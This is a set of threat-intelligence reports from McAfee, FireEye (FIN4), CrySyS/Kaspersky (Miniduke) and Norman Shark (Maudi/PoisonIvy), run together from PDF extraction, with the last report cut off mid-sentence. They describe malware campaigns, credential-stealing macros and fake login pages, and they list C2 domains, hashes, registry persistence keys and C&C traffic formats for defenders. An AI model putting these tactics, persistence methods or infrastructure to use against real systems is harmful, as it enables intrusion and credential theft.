                                                    <caption>Decrypted file:</caption>

<figure></figure>                                                    

The decrypted file is responsible for the communication between the infected machine and C&C server as shown
in the following image.<figure></figure>


The following domains are used for C&C :

  nt-windows-online.com
  nt-windows-update.com
  nt-windows-check.com
  csrss-check-new.com

<heading>Exploitation Using Java (CVE-2011-3544):</heading>

In Java Rhino Script Engine Vulnerability, security manager is disabled during JavaScript execution, which would
enable full permission to the system during its execution.When the user clicks the link that came through the
spam mail, the exploit would be triggered on the vulnerable system.The downloaded payload creates and executes the following files:

      %Temp%\ tmp42e76b5f.bat -> random name
      %Application Data%\Keucot\ qagi.exe -> random name
      %Application Data%\ Okurp \ dezaa.ufy-> random name (encrypted content)

The following debugged code shows the batch being created while execution.<figure></figure>


The batch file has the following content:

<figure></figure>


The payload injects itself to the running system processes in the machine.They also monitor the browser
activities in the targeted browsers (Chrome, Firefox, Safari, and IE).<figure></figure>


The above picture shows the changes made to the configuration file so that cookies won’t be cleared when the
user shuts down the system.Also warning messages won’t be displayed when the user visits the malicious or
insecure pages.Malicious threads injected to the processes monitor the user’s activities and collect the information about the
Outlook contacts and browser cookies, along with the system information.The collected information is stored as
an encrypted content and sent to the command & control server.Some of these exploits download Ransomware
and Zbot payloads.C&C Server:

29f2aad01fee3663.com

McAfee has coverage for this exploit CVE-2011-3544 and detects the downloaded payload used in the targeted
attack as BackDoor-FJJ.</section>

<section>
<heading>Exploit Heat Map</heading>

The following statistics show the usage of the vulnerabilities in the targeted attack in the last quarter.HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon "Userinit"
"C:\WINDOWS\system32\userinit.exe,""C:\WINDOWS\system32\userinit.exe, C:\Program Files \WindowsNT\svchost.exe"

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Zeemav: ""C:\Documents and
Settings\Home\Application Data\Keucot\qagi.exe""

<heading>Mitigation</heading>
Users are requested to exercise caution while opening unsolicited emails and unknown links.Users are
advised to update Windows and third-party application security patches and virus definitions on a regular
basis and have proper filtering rules.   Use Access Protection Rules from accessing such run keys.   Please keep your anti-virus updated.   Keep software up-to-date with the latest available patches.   It is advisable to use your firewall to monitor unusual traffic.   Disable AutoPlay to prevent the automatic launching of executable files on network and removable drives.</section>

<section>
<heading>Getting Help from the McAfee Foundstone Services team</heading>
This document is intended to provide a summary of current intelligence and best practices to ensure the highest
level of protection from your McAfee security solution.The McAfee Foundstone Services team offers a full range
of strategic and technical consulting services that can further help to ensure you identify security risk and build
effective solutions to remediate security vulnerabilities.You can reach them here: https://secure.mcafee.com/apps/services/services-contact.aspx
</section>
<footer>
                                                                                    © 2011 McAfee, Inc. All rights reserved.</footer>                                                                                    

</doc><doc>
<cover>
                          SPECIAL REPORT




HACKING
THE STREET?FIN4 LIKELY PLAYING
THE MARKET




WRITTEN BY:
BARRY VENGERIK
KRISTEN DENNESEN
JORDAN BERRY
JONATHAN WROLSTAD




                    SECURITY
                    REIMAGINED
                    </cover>
                    <header>
Hacking the Street?FIN4 Likely Playing the Market</header>




                               F
                                      ireEye is currently tracking a group that         
                                      targets the email accounts of individuals         
                                      privy to the most confidential information of     
                               more than 100 companies.The group, which we             
                               call FIN4, appears to have a deep familiarity with       
                               business deals and corporate communications, and         
                               their effects on financial markets.FIN4 has targeted             
                               individuals such as top executives, legal counsel,       
                               outside consultants, and researchers, among others.We are able to characterize FIN4’s activity from
the incidents to which we have responded in
our clients’ networks, FIN4’s attempts to
compromise our managed service clients, our
product detection data, and further independent
research.Our visibility into FIN4’s activities is
limited to their network operations; we can only
surmise how they may be using and potentially
benefiting from the valuable information they
are able to obtain.However one fact remains
clear: access to insider information that could
make or break stock prices for dozens of publicly
traded companies could surely put FIN4 at a
considerable trading advantage.<figure>
 KEY FINDINGS



    100+
   TARGETS
  Since mid-2013, FIN4          FIN4 knows their targets.the public companies
  investor relations, legal     and the inner workings      them to view private        These lures appeal to        involved in negotiations.counsel, and investment       of public companies.email correspondence.common investor and          They also have
  banking.pharmaceutical                                                                        and entering their email
  companies.credentials.</figure>


<footer>3 fireeye.com</footer>
<header>Hacking the Street?Since at
                               least mid-2013, FIN4 has pursued targets at           
                               more than 100 organizations, over two-thirds of
                               which are public healthcare and pharmaceutical        
                               companies.The remaining targets include              
                               advisory firms that represent public companies        
                               and a handful of public companies in other            
                               sectors closely followed by market watchers.All but three of the public companies are listed      
                               on the NYSE or NASDAQ, with the remaining
                               three listed on non-US exchanges.In order to get useful inside information, FIN4
compromises the email accounts of individuals
who regularly communicate about market-
moving, non-public matters.The group       
                               frequently employs M&A-themed and SEC-themed              
                               lures with Visual Basic for Applications (VBA)            
                               macros implemented to steal the usernames and             
                               passwords of these key individuals.Additionally,         
                               FIN4 has included links to fake Outlook Web App           
                               (OWA) login pages designed to capture the user’s          
                               credentials.Once equipped with the credentials,          
                               FIN4 then has access to real-time email                   
                               communications—and presumably insight into                
                               potential deals and their timing.Many of FIN4’s lures appeared to be stolen                
                               documents from actual deal discussions that the           
                               group then weaponized and sent to individuals             
                               directly involved in the deal.In some cases, the         
                               discussions were public knowledge and widely              
                               reported in the media, while others were still in the     
                               early exploration and due diligence phases.In one        
                               instance, we observed FIN4 simultaneously target          
                               five different organizations involved in a single         
                               acquisition discussion.The group targeted
                               individuals at the five firms several months before
                               the organizations’ involvement in the acquisition
                               talks went public.</section>
<section>
Lasering in on Healthcare and
Pharmaceuticals
We believe FIN4 heavily targets healthcare and
pharmaceutical companies as stocks in these
industries can move dramatically in response to
news of clinical trial results, regulatory decisions, or
safety and legal issues.In fact, many high-profile
insider trading cases involve the pharmaceutical
sector.We’ve observed FIN4 access information
on a wide variety of issues—including drug
development, insurance reimbursement rates, and
pending legal cases—all of which can significantly
influence the price of healthcare industry stocks.In one case, FIN4 targeted employees involved in
Medicaid rebates and government purchasing
processes - these issues can heavily influence stock
prices.Healthcare and pharmaceutical companies
depend heavily on the decisions of large third party
payers (like Medicaid) whose purchasing power and
rebate decisions can make or break a company’s
earnings.FIN4 would presumably use this
information to evaluate healthcare companies’
future revenue.<footer>5 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>

</section>
<section>

FIN4’s campaign codes illustrate their interest
in the organizations and job roles most likely
to have access to market-moving information
before it goes public.Keeping it Organized                                    
                               FIN4 organizes the targets of their activity with       
                               over 70 unique “campaign codes” to designate the        
                               employer of the individuals they target, or in some     
                               cases the generic roles the targeted individuals play   
                               within that organization.These campaign codes function as labels that
                              FIN4 uses to identify the origin of usernames
                              and passwords stolen from their targets.These
                              campaign codes are transmitted to FIN4’s
                              command and control (C2) servers along with
                              stolen credentials.For example:

                               •	   CEO_CFO_COO_CORPDEV
                               •	   SCIENTISTS_AND_RESEARCH
                               •	   <PHARMACEUTICAL COMPANY NAME>
                               •	   <ADVISORY FIRM NAME>

<figure></figure>

    Figure 3: Example of FIN4 Campaign Code




<footer>6 fireeye.com</footer>
<header>Hacking the Street?He gave      
detailed instances of his disagreements, and in doing so, may have   
unwittingly divulged confidential company information regarding
                                                                     
pending transactions.I am a longtime client and I do not think that this will bode well
for future business.The post generated quite a few replies, most
                                                                     
of them agreeing with the negative statements.While I understand    
that the employee has the right to his opinion, perhaps he should    
have vented his frustrations through the appropriate channels
                                                                     
before making his post.The link to the post is located here (it
is the second one in the thread):                                    
http://forum.<domain>/redirect.php?url=http://<domain>%2fforum%2fequities%2f375823902%2farticle.php\par

                                                                     
Could you please talk to him?The embedded
macro displays a dialog box that mimics the
Windows Authentication prompt for the user to
enter their domain credentials.These credentials
are transmitted to a server controlled by the group,
allowing FIN4 to hijack that user’s email account.FIN4 also sends highly tailored emails that typically
play on the recipient’s knowledge or interest in a
pending deal.In several instances, FIN4 has
included links to fake OWA login pages in their
phishing emails instead (Figure 4).This would be
useful for targeting organizations that may have
disabled VBA macros in Microsoft Office.</section>
<section>
FIN4’s Social Engineering
FIN4 knows their audience.Their spearphishing
themes appear to be written by native English
speakers familiar with both investment
terminology and the inner workings of public
companies.FIN4’s phishing emails frequently play
up shareholder and public disclosure concerns.Figure 4 shows the group’s strong command of an
executive’s concerns over illicit public disclosure,
particularly over executive incompetence and
compensation issues.This email came from an
account that FIN4 hijacked at a public company
and includes several watchwords: “disclosure” of
“confidential company information regarding
pending transactions.” These specific issues are
key terms at public companies, where the public
disclosure of sensitive business information is
strictly regulated.<footer>7 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>




    Figure 5: Generic FIN4 Lure Document

<figure></figure>


                               While a large share of FIN4’s lures are previously      
                               stolen confidential company documents, the group        
                               occasionally uses generic lures of interest to the      
                               investment community (Figure 5).FIN4 also uses existing email threads in a victim’s     
                               inbox to spread their weaponized documents.We’ve       
                               seen the actors seamlessly inject themselves into       
                               email threads.FIN4’s emails would be incredibly        
                               difficult to distinguish from a legitimate email sent
                               from a previously compromised victim’s email            
                               account.The actors have also Bcc’d all recipients,     
                               making it even more difficult for recipients to         
                               decipher a malicious email from a legitimate one.</section>
                                        <section>

                                A Fly on Many Walls
                               In several of our investigations, FIN4 targeted
                               multiple parties involved in a business deal,
                               including law firms, consultants, and public
                               companies.In one instance, FIN4 appeared to
                               leverage its previously-acquired access to email
                               accounts at an advisory firm (“Advisory Firm A”) to
                               collect data during a potential acquisition of one of
                               Advisory Firm A’s clients (“Public Company A”).FIN4 proceeded to send a spearphishing email
                               from a compromised account at Advisory Firm A to
                               another advisory firm (“Advisory Firm B”), who was
                               also representing Public Company A. FIN4 used a
                               SEC filing document as a lure.After news of the
                               possible acquisition was made public, Public
                               Company A’s stock price varied significantly.It is
                               likely that FIN4 used the inside information they
                               had to capitalize on these stock fluctuations.<footer>8 fireeye.com</footer>
<header>Hacking the Street?Public Company B.
             M&A opportunity.(Figure 6).The     
                               group likely implements these rules to prevent         
                               compromised victims from receiving replies from        
                               intended targets that their email account may be       
                               compromised, and likely buys FIN4 extra time           
                               before victim organizations detect their activities.However the scale of FIN4’s
                              operations, with targets at more than 100 public
                              companies, coupled with their tactic of going after
                              key individuals’ emails, sets this group apart.Our visibility into FIN4 is limited to their network
                              operations, so we cannot say for certain what
                              happens after they gain access to insider
                              information.What we can say is that FIN4’s
                              network activities must reap enough benefit to
                              make these operations worth supporting for over a
                              year—and in fact, FIN4 continues to compromise
                              new victims as we finish this report.<footer>10 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>


</section>
<section>
<heading>
APPENDIX:
TACTICS
</heading>



                               FIN4 employs a simple, yet effective, method to    
                               gather targets’ user credentials through their     
                               spearphishing emails.Using VBA macros, they       
                               embed malicious code into already existing and     
                               legitimate company documents.Embedded in          
                               each Microsoft Word or Excel document is a         
                               malicious macro that prompts the user for their    
                               Outlook credentials.We have also observed this    
                               group send emails with links to fake Outlook Web
                               App (OWA) login pages that will also steal the
                               user’s credentials, however we have not observed
                               this tactic in recent months.</section>
<section>
                               VBA Macros Embedded into
Legitimate Documents
The embedded VBA macro consists of a module
typically entitled “Module1” and a user form that
has been called both “UserForm1” and
“UserLoginForm”.The code in Module1 contains
the information needed to communicate with the
C2 server (Figure 7).Figure 7: Example of
    “Module1” used in
    one of the most
    recent campaigns

<figure></figure>


<footer>11 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>



    Figure 8: Example of “UserForm1” with Campaign Code


<figure></figure>

                               The userform contains the code for the user                  
                               credentials prompt and an artifact that is highly            
                               indicative of the actors’ targeting.We have identified                      
                               over 70 unique campaign codes to date.This                  
                               campaign code is transmitted to the C2 server                

                               along with the victim’s username and password, as
                               seen in Figure 8.Many of the fake Outlook windows opened by the
                               macros contain the logo of the company targeted
                               giving the pop-up apparent legitimacy.Figure 9
                               below represents a generic pop-up, with no
                               company-specific information that a user might
                               see after opening the document.Only after
                               credentials are entered will the document appear
                               for the user.Figure 9: Malicious Dialogue that Prompts for User’s Credentials

<figure></figure>


<footer>12 fireeye.com</footer>
<header>Hacking the Street?FIN4 then       
                               uses the collected credentials to login to victim      
                               email accounts.In addition to gaining access to the   
                               victim’s private communications, FIN4 also uses        
                               the compromised accounts to email malicious            
                               documents to additional targets inside and outside     
                               the victim company.The group is currently active      
                               as this report goes to publication and recently        
                               used the domains junomaat81[.]us and
                               lifehealthsanfrancisco2015[.]com as their C2s.FIN4 appears to be heavily reliant on Tor (software
that enables users to browse the Internet
anonymously by encrypting their internet traffic
and routing it through servers around the world)
and has been seen using Tor to login to victims’
email accounts after obtaining the compromised
user credentials.We have detected at least two
User Agents that the actors have used and which
can be used to identify potentially suspicious OWA
activity in network logs, when paired with
originating Tor IP addresses.<figure>
                                  Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0


                                  Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0
</figure>


                               Figure 11: FIN4 User Agents




<footer>13 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>


 Table 1: List of known Actor-Registered C2 Domains


<table>

 Actor-Registered C2 Domains

 ellismikepage[.]info                         lifehealthsanfrancisco2015[.]com

 rpgallerynow[.]info                          dmforever[.]biz
 msoutexchange[.]us                           junomaat81[.]us

 outlookscansafe[.]net                        nickgoodsite.co[.]uk
 outlookexchange[.]net
</table>



                               We have identified nine C2 domains that we            
                               believe were registered by the actors to conduct      
                               these operations.</section>
                                                             <section>                        
                               What Can Network Defenders Do?The relative simplicity of FIN4’s tactics             
                               (spearphishing, theft of valid credentials, lack      
                               of any malware installed on victim machines)          
                               makes their intrusion activity difficult to detect.However a few basic security measures can help


thwart the group’s efforts.Disabling VBA macros
in Microsoft Office by default, as well as blocking
the domains listed in Table 1 will help protect
against FIN4’s current activities.Additionally,
enabling two-factor authentication for OWA and
any other remote access mechanisms can help
prevent credentials stolen in this manner from
being leveraged successfully.Companies can also
check their network logs for OWA logins from
known Tor exit nodes if they suspect they are
victimized.Typically, legitimate users do not use
Tor for accessing email.While not conclusive, if
paired with known targeting by this group, the
access from Tor exit nodes can serve as an
indicator of the group’s illicit logins.347.3393) | info@fireeye.com | www.fireeye.com

<footer>14 fireeye.com</footer>
<header>Hacking the Street?FIN4 Likely Playing the Market</header>




FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (


© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye, Inc.
All other brands, products, or service names are or may be trademarks or service marks of
their respective owners.WP.HTS.EN-US.112014
15 fireeye.com

</section>
</doc>Based on joint work with Kaspersky Labs GREAT
Team
</cover>

<section>
<heading>Document history</heading>
27/02/2013 Initial release
</section>

<toc>
Table of contents
1.Introduction .............................................................................................................................................4
2.Known malware samples.....................................................................................................................5
3.Detection of the running malware ................................................................................................ 11
4.C&C communication ........................................................................................................................... 13
     4.1.Detection of C&C communications..............................................................................................................15
     4.2.Initial C&C communication ............................................................................................................................15
     4.3.Other indicators of C&C communication: Google and Twitter queries......................................18
</toc>     

<section>
<heading>1.Introduction</heading>
Our malware analysis team in the CrySyS Lab, Budapest worked together with Kaspersky
Labs on the analysis of the Miniduke malware.Our participation in this research was justified
by a detected Hungarian incident.A detailed report on the results of our joint efforts has
been published by Kaspersky Labs Securelist blog site (see link below).The Kaspersky Labs
report describes what we currently know about the operation of Miniduke including its
stages, and also information on the C&C infrastructure and communications.In this report,
we summarize the indicators of a Miniduke infection, and give specific hints on its detection.The Kaspersky Labs report is available at

     https://www.securelist.com/en/blog/208194129/The_MiniDuke_Mystery_PDF_0_day
     _Government_Spy_Assembler_Micro_Backdoor
</section>


<section>
<heading>2.Known malware samples</heading>
The available malware samples are highly obfuscated, and compiled by a polymorphic
compiler.The attackers were able to produce new variants with only a few minutes
difference between compile times.Therefore the number of distinct samples could be very
large.bg_<sthg>.gif and bg_<sthg>.gif_dec refers to pieces of stage 2 of the malware, which are
downloaded from the C&C server by the stage 1 code.bg_<sthg>.gif is a gif file that contains
encrypted code, bg_<sthg>.gif is the corresponding decrypted file.bg_<sthg>.gif is generally
24484 bytes long, while bg_<sthg>.gif_dec is 22784 bytes long.These are typically 334093 byte long files with a 13-byte long gif header.Below, we list the
hashes of these files; in case of the decrypted files with .gif_dec extension, we list the hashes
for the internal decrypted PE file.Detection of the running malware</heading>
Due to a large number of compiled samples, there is a high chance that the current version is
difficult to detect by signatures.Yet, there are common features in the samples that can be
used to identify the malware components.In every sample we checked, the “Program Files/Startup” contains a file with “.lnk”
extension after installation.This is used to start up the malware after the computer is
rebooted.An example of the lnk file created by the malware:

<figure></figure>


The contents of the .lnk files are similar to the below described path and file, but random
names are used.The extension of the dll called is generally “.tmp” or “.cat” or “.db” (not
sure about full list) and the export function called has a random name."C:\WINDOWS\system32\rundll32.exe"
C:\DOCUME~1\ALLUSE~1\APPLIC~1\base.cat,JorNgoq

The running process of the malware can be pinpointed, e.g., by using ProcessExplorer.The
running copies of stage 1 and 2 appear as separated rundll.exe processes.It is very useful to
create a memory dump from these running processes, e.g., by using SysInternals
ProcessExplorer.On the picture below, the export function name they use is GqOlls.The names seem to
follow a pattern: 6 chars long with two upper case letters.<figure></figure>

A not fully cross-checked information is that during installation the malware will be copied in
two copies to the system and the two executables differ.This might mean that the
executable modifies itself.For example, we recovered the following two files:

       md5sum base.cat :113e6fc85317fdd135e3f5f19e6c7a58 *base.cat

       md5sum ~6rld.tmp : c786a4cdfe08dbe7c64972a14669c4d1 *~6rld.tmp

where base.cat is the startup file, which is created based on ~6lrd.tmp.base.cat is stored in
the “All users” directory, whereas ~6lrd.tmp is stored in a user’s directory, e.g., in the guest
user      directory as “C:\Documents and Settings\guest\Local Settings\Application
Data\~6rld.tmp”

This user directory contains at least one more file, update.cmd with a specific content that
could be used for detection.E.g., a search for any *.cmd files with content “TASKKILL /f /IM
acro*” might be a a detection tool of this stage.<figure></figure>



<figure></figure>

As for stage 3 of the attack, it is important to note that it is not yet analyized deeply.So once
a victim downloads the ~300k long piece of code, we don’t know what happens with the
previous stages, and we have no information about detections once this stage is reached,
except the usage of the C&C server news.grouptumbler.com.</section>

<section>
<heading>4.C&C communication</heading>
There are multiple layers of C&C communications in the malware.First the malware uses
Google search to receive information from its master.Then, it uses the Twitter messaging
service looking for the twits of a specific Twitter user.Commands received via this channel
trigger the download of stage 2 and stage 3 code from the C&C server.At the time of this writing, port 80 seems to be closed on this server.Address
and open port information is below:

<figure>
news.grouptumbler.com/news/feed.php
IP: 200.63.46.23

Interesting ports on 200.63.46.23:
Not shown: 65524 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
111/tcp   open     rpcbind
920/tcp   open     unknown
1437/tcp open      tabula
46436/tcp open     unknown
</figure>
    <caption>Figure 6 – Stage 3 C&C server information</caption>
</section>    

<section>
<heading>4.1.Detection of C&C communications</heading>
Basic detection can be based on 3 queries that are initiated by the victim computers within
seconds.<figure>
www.google.com – port TCP/80 - HTTP
twitter.com –port TCP/443 - SSL
www.geoiptool.com –port TCP/80 - HTTP
</figure>
      <caption>Figure 7 – Initial web page – and possibly DNS queries issued by the malware</caption>




Known search strings in Google search (see below) can also be used to detect the malware.Unfortunately, these strings are most likely unique to each C&C server or victim, thus
unknown samples might use other strings, but possibly with the same length.<figure>
lUFEfiHKljfLKWPR
HkyeiIDKiroLaKYr
lUFEfiHKDroLaKYr
</figure>
    <caption>Figure 8 – Google search strings used by the malware</caption>




The malware also sends a query to the geoiptool.An example is shown below:
<figure>
GET / HTTP/1.1
User-Agent: Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US; Trident/5.0)
Host: www.geoiptool.com
</figure>
      <caption>Figure 9 – Geoip lookup query sample – Agent string might be different for each query!</caption>

</section>

<section>
<heading>4.2.Initial C&C communication</heading>
Initial communications with the stage 2/3 delivery C&C servers (such as arabooks.ch) can be
used to develop detection signatures as follows:

The malware retrieves the URL using a Twitter query as described earlier.Then, we can
observe the first query from the victim towards the stage 2/3 delivery C&C server.This query
contains pure HTTP traffic on port 80 to the server following the template below.GET /original/path/shortname/index.php?e=aaaaaaaaa

where:

    •    shortname can be a number of strings, generally human readable (e.g.lib, engine,
         forum, forumengine etc.)•    "e=" is not constant, can be anything, but generally 1-2 letters long
    •    aaaaaaaaa stands for some Base64-like text (see details below)
    •    the servers used are assumed to be legitimate sites, just hacked by the attackers.After decoding, a string of data, partially binary will be available.Parts are
separated by the delimiter character "|".The format and a numerical example are below:

         <binary data ( ~100 bytes)>|<numerical ID ( ~10 digits)>|<version number>
 e.g.,

          <binary data>|5551115551|1.13


As the binary data itself may contain the ”|” character, parsing should start from the end
(i.e., the numerical ID starts from the second “|” character from the end).In additional, the
ID length may vary (not fully confirmed), but it seems to be around 10 digits.Finally, the
version number always follows the pattern <1digit><dot><two digits>, e.g., 1.1X 3.1X.The correct decoding of the HTTP query information should be enough to quickly develop
possible IDS-based detections.As we have seen, detection is complicated, but not
impossible.0x00e0:   0a41   6363   6570   742d   456e   636f   6469   6e67   .Accept-Encoding
         0x00f0:   3a20   677a   6970   2c20   6465   666c   6174   650d   :.gzip,.deflate.0x0100:   0a55   7365   722d   4167   656e   743a   204d   6f7a   .User-Agent:.Moz
         0x0110:   696c   6c61   2f34   2e30   2028   636f   6d70   6174   illa/4.0.(compat
         0x0120:   6962   6c65   3b20   4d53   4945   2037   2e30   3b20   ible;.MSIE.7.0;.0x0130:   5769   6e64   6f77   7320   4e54   2035   2e31   3b20   Windows.NT.5.1;.0x0140:   5472   6964   656e   742f   342e   303b   2049   6e66   Trident/4.0;.Inf
         0x0150:   6f50   6174   682e   3129   0d0a   486f   7374   3a20   oPath.1)..Host:.</figure>
    <caption>Figure 11 – Agent strings used in C&C comms – might be partial or wrong – not useful for detection</caption>

</section>

<section>
<heading>4.3.0x0060:    e5d4   181d   2df5   9f4a   402c   29ec   8a46   fdf5   ....-..J@,)..F..
         0x0070:    ecef   caa6   e37d   46dc   5d22   c152   09dc   8d49   .....}F.]".R...I
         0x0080:    eccb   b4f4   dac3   fa91   21f8   8e22   c15a   19f4   ........!..".Z..0x0090:    871b   fb9f   3bfb   972e   f1cb   b3e9   ab6c   f289   ....;........l..
         0x00a0:    31f9   9837   0d0f   17e9   8446   7333   0bfb   e8d3   1..7.....Fs3....
</figure>         
    <caption>Figure 14 – GIF File header sent back by the C&C server</caption>

<figure></figure>


For stage 3 (i.e., <id>.gif files), the file downloaded has a larger size (~300KB).It also begins
with a GIF header, but that header is only 13 bytes long, and then starts the encrypted
executable, as shown below:


<figure></figure>

Examples for twits containing the URL of the C&C server are shown below:
<figure>
The weather is good today.Sunny!uri!wp07VkkxYt3Mne5uiDkz4Il/Iw48Ge/EWg==

Albert, my cousin.He is working hard.uri!wp07VkkxYmfNkwN2nBmx4ch/Iu2c+GJow39HbphL

My native town was ruined by tornado.uri!wp07VkkxYt3Md/JOnLhzRL2FJjY8l2It
</figure>

    <caption>Figure 15 – Known twitter answers for C&C discovery</caption>

The twitter information is currently not very useful for content based detection, as it is
downloaded through SSL connection, and therefore, IDS rules can only be applied if some
SSL proxy is used.<figure></figure>

An interesting observation is that this user follows 4 partners, most likely for deception.<figure></figure>
</section>

</doc><doc>
<cover>
NORMAN SHARK

The Chinese Malware Complexes:
The Maudi Surveillance Operation
Snorre Fagerland, Principal Security Researcher


</cover>

<footer>1|The Chinese Malware Complexes :Maudi            Norman Shark</footer>
<section>

<heading>Introduction</heading>
Maudi is a series of small malwares that share similar configuration and behaviour.The naming of this family has not
been very established, but some samples are detected by some vendors as Maudi or PoisonIvy.This is partly accurate as
Maudi trojans in almost all cases install the well known PoisonIvy remote access trojan.These malwares are not particularly new - they have been in circulation for a long time, probably going back to at least
2009.Still, they provide a backdrop to other attacks that is interesting.</section>
<section>
<heading>Behaviour</heading>
The malware itself is not very complex.These are small installers that create two files – one library (typically called
msacm32.drv, ntshrui.dll or wdmaud.drv) in the Windows folder, and a raw PoisonIvy shellcode blob called user.dat,
user.db, temp.db or something along those lines.The installer then spawns explorer.exe, which then automatically loads
the malicious library through a mechanism called DLL hijacking aka DLL preloading <fn>1</fn>.There are innocent libraries with
the same names in the Windows System folder, but since the malicious libraries are placed in the Windows folder, they
sneak in the queue and Explorer loads them first.The malicious library then reads and directly calls the PoisonIvy code in user.dat, which establishes an encrypted
communication with the configured C&C server.When communication is established, the attacker has unauthorized access to the computer.</section>

<footer>2|The Chinese Malware Complexes :Maudi                                                                    Norman Shark</footer>
<section>
<heading>Configuration</heading>


PoisonIvy code blobs are preconfigured in the PoisonIvy builder program to contain information about which Command
& Control server to contact, which port to establish connection on, and various other parameters.<figure></figure>

<caption>The PoisonIvy builder</caption>



The Maudi PoisonIvy droppers contain their own small xor-encoded configuration block which overrides the default
settings stored in the PoisonIvy blob.This usually contains the name of the C&C server, port and what corresponds to the
PoisonIvy profile ID.Example Maudi configuration:

<figure></figure>


Profile ID: xfish
C&C: 171088046.gnway.org
port: 0x0D84 = 3460


The ID xfish is used in many of these malwares and may be a default value, but there are many others in use.<footer>3|The Chinese Malware Complexes :Maudi                                                                  Norman Shark</footer>
PoisonIvy uses the Camellia 256-bit block cipher for its encrypted communication.The password for this communication
is usually hardcoded in the malware itself; the default value used by the builder is “admin”.The passwords used by Maudi droppers vary.Sometimes the default value is used, other times the password is set to
longer strings.There seems to be an affinity for passwords of length 11 (0x0b).A few are shown below.These certificates vary somewhat, but most contain the recognizable string “WWW.CeleWare.NET” or
“WWW.AeleWare.NET” in their Organizational Unit (OU) section.The CeleWare strings are default values left by the free
code signing tool CeleSign.exe from Yonsm.NET.Though the tool itself seems innocent enough, many files signed by it are malicious.<figure></figure>


There were a number of different such certificates, and it may be that the varying certificates denote different
campaigns, projects or other contexts – for example, all samples we have seen signed “DataBase@Hotmail.com” are
droppers that install Maudi components signed “MogolSoft@Hotmail.com” or “SoftSign@HotMail.com”.<footer>5|The Chinese Malware Complexes :Maudi                                                                     Norman Shark</footer>
<heading>Stolen certificates</heading>

Though by far most of these malwares use test certificates, not all follow this pattern.A few are not signed at all, and in
two cases we have seen the use of a stolen certificate.The certificate in question belongs to YNK Japan Inc.

<figure></figure>


This is the configuration block from one of the YNK-signed Maudi samples.C&C is p.hannmaill.net, port is 3460 (0xD84),
and tag is xfish.These two trojans are configured to connect to p.hannmaill.net and s.hiinet.net, respectively.These domains appear
registered by the same entity (sofoxman@gmail.com).Both the domains and the certificate have been connected to targeted attack campaigns before.What quickly becomes obvious is that most of the
samples are connected; either they use the same certificate, or their certificate cluster is connected with other clusters
through common Command&Control servers.Some clusters (shown at the lower right and left side) seem unconnected
beyond the fact that they use the same malware.The Command&Control servers used are in many cases organized through well-known dynamic DNS providers such as
3322.org, zapto.org and so on, but there are also a few seemingly directly registered second level domains.A full list of
these is provided in the appendix.<footer>7|The Chinese Malware Complexes :Maudi                                                                     Norman Shark</footer>
</section>
<section>
<heading>Targeting</heading>


Local Chinese interests and human rights activists

We do not have extensive data on which targets have been exposed to Maudi malware, but we have some examples
which give decent hints.Some Maudi droppers display images, like the ones below:


<figure></figure>
<caption>
This picture was widely distributed in 2009, and allegedly showed results of violence during an Uighur riot.However, it
was later reported to be taken from a car accident.</caption>

<figure></figure>
<caption>
This picture from Xinhuanet is reportedly from the 2008 riots in Lhasa, Tibet.</caption>

<footer>8|The Chinese Malware Complexes :Maudi                                                                    Norman Shark</footer>
These are classic examples of decoys used in targeted campaigns against activists working for the rights of ethnic
minorities within the Chinese borders.Other decoy documents contain small messages in Chinese; and Chinese name listings.This gives the general impression that this family is used mostly against domestic Chinese targets and human rights
activists.Other research has confirmed this impression.In his 2010 article “Human Rights and Malware Attacks” <fn>2</fn>,
security researcher Nart Villeneuve documents the use of Maudi as the downloaded payload of spearphishing attacks.The initial payload in that case was a mail attachment, an exploited PDF file (readme.pdf, md5
72bdca7dd12ed04b21dfa60c5c2ab6c4) which downloaded and decoded an encoded blob (md5
ec16143a14c091100e7af30de03fce1f) from the site www.humanright-watch.org, not to be confused with the legitimate
Human Rights’ Watch website hrw.org.The decoded file was a Maudi dropper, self-signed using the name “soft@hotmail.com”, and the dropped component
belonged to the “JinDiQIAO@hotmail.com”-signed cluster.<heading>Mongolia</heading>

There are hints at other targets as well.A group of Maudis use domain names and other strings that seem to indicate a
focus on a specific region, namely Mongolia.Mongolia is an interesting country.It is democratic with a multi-party system, and has a market-driven economy.It is
squeezed between two very powerful nations – Russia to the North and China to the South.It is also a country rich on
geological natural resources.The initial hints about this targeting are vague.Some of the Maudi samples are signed using self-signed certificate issued
to “mogolsoft@hotmail.com”.Others use the Command & Control domain “mol-goverment.com”.This domain was
registered by a known targeted attack actor, hlemonk@163.com, who has registered a string of other malware-
connected domains – among others goodmongol.com.However, when looking more closely, more solid ties to Mongolian targets can be found.The Maudi domain
bodologetee.com (registered by the email entity mongolianews@yahoo.com) can be documented used in other attacks
on apparent Mongolian targets.For example, the malware dropper cc1a806d25982acdb35dd196ab8171bc, a WinRAR SFX executable installed through
the use of the Word exploit CVE-2012-0158, contained a PlugX component configured to connect to
ppt.bodologetee.com.This is documented in the Norman Shark blog post “The Chinese Malware Complexes: PlugX Used
against Mongolian Targets”.<fn>3</fn>





<footer>9|The Chinese Malware Complexes :Maudi                                                                    Norman Shark</footer>
</section>
<section>
<heading>Connections to other attacks</heading>


Indirectly, we see that the Maudi infrastructure shares parameters with several well known targeted attack campaigns.o qwer.wekby.com - domain
Three samples connect to qwer.wekby.com, known from the RSA breach in 2011 <fn>4</fn>.These samples are (md5, profile ID):

28b5241ca13603636dbf626792231161, qwerw
6a83dc3f53079e17ecc49cbc0dacc8f5, qwerw
cf45dbdb3718b4b728c2dd894032464b, qwerw


The malwares used in the RSA intrusion itself were also PoisonIvy, though used a different dropper mechanism and were
